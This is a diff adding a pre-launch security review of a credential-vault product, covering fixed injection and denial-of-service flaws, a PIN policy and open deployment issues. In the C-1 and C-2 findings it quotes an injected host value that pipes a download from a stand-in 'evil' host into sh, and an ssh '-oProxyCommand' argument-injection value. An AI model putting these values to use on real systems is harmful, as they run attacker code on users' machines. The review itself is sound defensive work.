@@ -1,0 +1,235 @@
+# Security review — 2026-08-24, the day before the company launch
+
+> Scope: the whole product as it will be deployed — the **public** Cred Vault Server behind
+> nginx, the extension installed by employees, the Docker stack, and the dependency trees of
+> both halves. Four parallel reviews (server surface, cryptography, extension, deployment) plus
+> a git-history secret scan and a dependency sweep run directly.
+>
+> Predecessor: [SECURITY_REVIEW_2026-08-23.md](SECURITY_REVIEW_2026-08-23.md). Every claim that
+> review made about a fix was re-verified against the code rather than trusted — one of them had
+> been undone in the meantime, which is finding **C-3**.
+
+## The short version
+
+**Three CRITICAL findings, all fixed and each reproduced before it was fixed.** Two of them are
+the same root cause wearing different clothes: an entity's `host` field is attacker-influenced,
+and two different parsers downstream took it as instructions. One is a server-side denial of
+service that a single authenticated colleague could repeat at will.
+
+**No leaked secrets.** The git history was scanned across every commit, not only the working
+tree; nothing has ever been committed. **No vulnerable dependencies** in either half.
+
+The cryptography is sound and current: AES-256-GCM with per-write random nonces, scrypt at
+`N=2^17` (which is what OWASP recommends where Argon2id is unavailable), no legacy primitive
+anywhere in either codebase. The one weakness in that area was not the algorithms but the **PIN
+policy in front of them**, which is now fixed.
+
+## What was fixed before launch
+
+| | Finding | Where |
+|---|---|---|
+| **C-1** | A shared or synced entity ran local commands on **Connect** | `sshCommand.ts` |
+| **C-2** | The same field made `ssh` run a local command with **no shell involved** | `sshExecCommand.ts` |
+| **C-3** | One colleague could **OOM the server for everyone**, repeatedly | `Models.cs`, `Program.cs` |
+| **H-1** | A synced entity ran a command through the **env-variable probe** | `envProbe.ts`, `types.ts` |
+| **M-1** | The **PIN floor** accepted `12345678` on a blob attacked offline | `pinPolicy.ts` |
+
+### C-1 · A shared entity ran local commands on Connect (CRITICAL, fixed)
+
+`buildSshCommand` quoted `sshKeyPath` from its first version and never quoted `user@host`. The
+composed line goes to `terminal.sendText(line, true)` — the `true` presses Enter.
+
+`host` is not our string. Sync merges whatever a shared vault location holds, and Accept Share
+imports whatever a colleague sealed; the envelope's GCM tag authenticates the **container**, not
+the plausibility of a field inside it. So a host of `a.com; curl http://evil/x|sh` ran on the
+click of Connect, under an entity name the victim had chosen to trust.
+
+### C-2 · The same field, and `shell: false` was no defence (CRITICAL, fixed)
+
+`buildSshExecArgv` pushed the destination as a bare positional argument. ssh's own getopt reads
+a leading dash as a **flag**, so a host of `-oProxyCommand=…` is not a hostname — it is an
+instruction to run a local command *before* authenticating anything.
+
+This one is worth dwelling on, because the exec path was documented as safe on the grounds that
+it never touches a shell. That is true and it does not help: the injection is in **ssh's**
+parser, not a shell's. Reproduced against OpenSSH 10.3 with a benign marker — the file was
+written.
+
+**Both are now refused at composition rather than escaped.** `isSafeSshHost` / `isSafeSshUser`
+reject anything that is not a hostname or an account name, and the exec path additionally passes
+`--` before the destination. Escaping would answer the first parser and not the second, and a
+value that cannot be a hostname has no honest use. Windows domain accounts (`CORP\alice`),
+machine accounts (`HOST$`) and bracketed IPv6 still work.
+
+### C-3 · A repeatable outage for the whole company (CRITICAL, fixed)
+
+Two defects that only matter together:
+
+1. `PayloadBytes()` counted the sealed fields and the entity name. **`EntityKind` was not
+   counted and not bounded** — it is never routed on and never hashed into a path, which is
+   exactly why nobody thought about it.
+2. `GET /api/shares` read the entire inbox into one `List<ShareItem>` before writing a byte.
+   The streaming fix from the 2026-08-23 review had been **undone by the Native-AOT migration**,
+   and `module_server.md` recorded the materialization as safe *because the inbox is capped* —
+   the cap that (1) walks around.
+
+So: any authenticated same-domain colleague posts shares to a real victim with `entityKind`
+padded to megabytes, bounded only by Kestrel's ~8 MB body limit, into an inbox that holds 500
+items. The victim's next sync reads it all into a 512 MiB container. The container restarts, the
+items are still on disk, and the next read repeats it.
+
+Now every client-controlled field counts toward the cap, `EntityKind` is bounded where the shape
+is judged, and the array is written to the response as it is read.
+
+### H-1 · A synced entity ran a command through the env probe (HIGH, fixed)
+
+`envProbeCommand` interpolated the variable name into a line typed into a terminal with Enter
+pressed. `isValidEnvName` was enforced on the form's own input **and nowhere else** — backwards,
+since the form is the one source that was never hostile, while `envBindings` is plaintext
+metadata that syncs. The probe now refuses a name that is not a name, and `isEntityMetadata`
+rejects the whole entity at the door.
+
+### M-1 · PIN strength, raised deliberately (fixed)
+
+The floor was eight characters of anything, and accepted `12345678` and `password`.
+
+Eight characters is NIST SP 800-63B's floor, and it is the wrong yardstick here. That guidance
+is written for an authenticator **behind a rate limiter**, where an attacker gets a handful of
+throttled tries. This PIN wraps a blob that deliberately lives where other people can read it —
+a NAS folder, a vault server, a colleague's inbox — and is attacked **offline and unthrottled**.
+At the shipped scrypt cost an all-digit eight-character PIN is 10^8 guesses: **tens of hours on
+a single modern GPU**, less on a rented cluster.
+
+**A share PIN is the sharper case.** A share is sealed with `recipientKeyId + pin`, and on the
+server transport — the one recommended for teams, and the one you are launching — `recipientKeyId`
+is the recipient's **email address**. Public, usually derivable from a name. There the PIN is not
+half the secret; it is all of it. And "tell it to them out-of-band" is exactly the UX that
+produces short numeric PINs spoken over the phone.
+
+Now refused: all digits under twelve characters, one character repeated, and the obvious list.
+Everything else is accepted with a live estimate of offline guessing time, which counts a word as
+a word rather than as random characters — pessimistic on purpose, because the number is advice
+about a secret.
+
+## Open — not fixed, with a recommendation for each
+
+Ordered by what I would do first. None is a reason to hold tomorrow's launch; the first two are
+worth doing this week.
+
+### O-1 · nginx, the one container facing the internet, has no memory or CPU limit (HIGH)
+
+`vault` has `deploy.resources.limits.memory`. **nginx does not**, and it is the only service with
+ports on `0.0.0.0`. A flood or an nginx-level leak has no ceiling and takes the host with it —
+including the containers doing backups and certificate renewal. Add the same block `vault`
+already has. One line, no behavioural risk, do it before the first busy day.
+
+### O-2 · certbot runs on a mutable `:latest` tag (HIGH)
+
+`certbot/certbot:latest`. That container holds the ACME account key and the certificate private
+keys, and it is re-pulled on every recreate. `VAULT_IMAGE` is pinned and documented as pinned;
+this is the same discipline missing on the container with the most sensitive material.
+`restore.sh` has the same slip with a bare `alpine`.
+
+### O-3 · The anonymous rate-limit bucket is one bucket for the whole internet (MEDIUM)
+
+The authenticated limiter partitions per verified email — verified, tested, correct. The
+anonymous fallback partitions on `RemoteIpAddress`, which behind nginx is always nginx. So every
+unauthenticated request on earth shares one 120-per-10s bucket. It exposes no vault data, but a
+single sender at roughly 12 requests a second can make public health checks and every 401/403
+path start returning 429. Fix: `UseForwardedHeaders` scoped to the docker `edge` network.
+
+### O-4 · WebAuthn credentials are scoped to bare `localhost` (MEDIUM, pre-existing)
+
+Already item 1 of [../todo/PLAN_extension_security_tail.md](../todo/PLAN_extension_security_tail.md).
+WebAuthn scopes a credential by RP-ID **string**, not by origin and port, so any local page on any
+`localhost:<port>` can ask for the same credential — and `credentialId` and `prfSalt` sit in
+plaintext in the vault envelope, on shared storage by design. It needs a local page, a physical
+touch, and the user not reading the browser prompt. Not remote and not silent, but the hardware
+factor is not actually scoped to this extension, which is what it is sold as. Fixing it breaks
+existing registrations, which is why that plan sequences it last — do it deliberately, not the
+night before a launch.
+
+### O-5 · Share metadata is unauthenticated on the NAS transport (MEDIUM, pre-existing, mitigated by deployment)
+
+`fromEmail` and `entityName` sit beside the sealed blob without AAD, so anyone who can write to a
+shared folder can label a share as coming from a colleague. **The server transport is immune** —
+it stamps the sender from the verified token — and that is what you are deploying. This is a
+reason to keep teams on the server and never to offer the folder transport as a team option.
+
+### O-6 · A `terminal`-kind entity runs its stored command verbatim (MEDIUM)
+
+`Run in Terminal` executes without a preview, justified in the module doc on the grounds that
+"these are commands the user wrote themselves". That premise does not survive sync and Accept
+Share, both first-class features. On the server transport the sender is stamped, so a hostile
+command arrives with a name attached — a real mitigation, not a fix. Recommendation: mark
+entities that arrived from elsewhere and require one confirmation showing the composed line
+before the first run, mirroring what the agent broker already does for its first use.
+
+### O-7 · `keytar` runs `node-gyp rebuild` at `npm ci` (LOW)
+
+Transitive through `@vscode/vsce`, a dev dependency that never ships to a user. It executes code
+at install time on developer machines and in CI. Use `npm ci --ignore-scripts` in CI where
+packaging is not the job.
+
+### O-8 · No OCSP stapling; GitHub Actions pinned by tag rather than SHA (LOW)
+
+The standard remaining items on an otherwise strong configuration. Neither is urgent.
+
+## Verified sound — what was checked and held
+
+This is the half of an audit that usually goes unwritten, and it is the half that says what was
+actually looked at.
+
+**Secrets.** Every commit in the repository's history was scanned for private-key material, `.env`
+files, cloud credentials, tokens and credential assignments — not merely the working tree, because
+a secret deleted in a later commit is still published. **Nothing has ever been committed.** The
+only private key on disk is throwaway output from the local ACME test harness, git-ignored by
+name. `.env.example` has only ever held placeholders.
+
+**Dependencies.** `dotnet list package --vulnerable --include-transitive` and `--deprecated`: clean
+in both projects. `npm audit` including dev: zero. The JWT library moved to 8.22.0.
+`FluentAssertions` deliberately stays at 7.2.2 — 8.x is the Xceed Community License,
+non-commercial only, which stops being a footnote the moment this is used commercially.
+
+**Cryptography.** AES-256-GCM with a fresh 16-byte salt and 12-byte IV on **every** write — no
+nonce reuse, which is the failure that would matter most. scrypt `N=2^17, r=8, p=1`: current OWASP
+guidance where Argon2id is unavailable, and memory-hard, which is the property that resists GPUs
+rather than merely being slow. The KDF-parameter **downgrade attack does not work** — the derived
+key is a function of `N`, so tampering with the recorded parameters breaks the GCM tag instead of
+weakening anything. Each key wrap is sealed independently, so one wrap's compromise cannot forge
+another. **No MD5, SHA-1, low-iteration PBKDF2, ECB, static IV or `Math.random()` anywhere in
+either codebase.**
+
+**Server authorization.** Every endpoint derives its resource from the verified token and nothing
+else; none accepts a caller identifier from a route, query or body. Share sender identity is
+stamped from the token. `alg=none` and wrong-key tokens are rejected. Filesystem keys are SHA-256
+hashes of the normalized email, so an email never reaches a filename. Startup refuses to run with
+no auth scheme, an empty domain list, or an HMAC key under 32 bytes. No secret, token or ciphertext
+reaches any log. Errors return a fixed string, never a stack trace.
+
+**Container and edge.** The app runs as uid 10001, read-only rootfs, all capabilities dropped,
+`no-new-privileges`, and **publishes no port at all** — reachable only through nginx. No Docker
+socket is mounted anywhere. TLS 1.2/1.3 only with a modern cipher list, HSTS with
+`includeSubDomains`, CSP, `X-Content-Type-Options`, `X-Frame-Options`, and `gzip off` — the last
+deliberate, to deny a BREACH-style side channel against ciphertext.
+
+**Extension.** Webviews use `default-src 'none'` with nonce-scoped scripts and empty
+`localResourceRoots`; every interpolated field is escaped. Secrets never enter a webview, with one
+deliberate and documented exception (the DB connection string in the edit form). Every clipboard
+copy expires in 45 seconds and clears only what it wrote. Materialized private keys are `0600`,
+named per call, deleted when the session ends and purged on activate and deactivate. The agent
+broker binds loopback only, its token is 256 bits from a CSPRNG, and its ceilings on output,
+wall-clock and concurrency are enforced in code rather than described in a comment.
+
+**Backup and restore.** Verified archives, atomic writes, a refusal to let an empty source shadow
+a good backup, and a rollback trap that restores state on any failure.
+
+## What this review did not cover
+
+- **No live penetration test** against the running deployment. This is a code and configuration
+  review; the first real traffic is the first test of the whole assembly.
+- **The restore rehearsal still has not happened.** [../todo/PLAN_server_ops.md](../todo/PLAN_server_ops.md)
+  has said so since 2026-08-23 and it remains the largest reliability risk in the product. A script
+  that verifies its own archive is not a restore somebody has watched succeed.
+- **Password auth over askpass in the agent exec path** has no automated coverage — it needs a live
+  SSH server. First real use is its proof.
